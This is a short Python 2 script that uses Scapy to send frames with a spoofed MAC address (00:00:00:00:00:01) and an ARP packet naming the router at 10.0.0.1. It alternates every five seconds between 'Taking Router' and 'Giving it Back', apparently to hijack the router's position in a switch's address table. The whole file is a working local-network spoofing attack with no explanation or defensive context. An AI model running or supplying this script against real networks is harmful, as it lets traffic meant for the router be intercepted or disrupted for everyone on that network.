#!/usr/bin/python

from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal


pktToStealRouter = Ether(src="00:00:00:00:00:01")/IP(dst="10.0.0.231")/ICMP()

while(1):
        print "Taking Router"
        sendp(pktToStealRouter)
        time.sleep(5)
        print "Giving it Back"
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src="00:00:00:00:00:01")/ARP(hwsrc="00:00:00:00:00:01", pdst="10.0.0.1"))
        time.sleep(5)

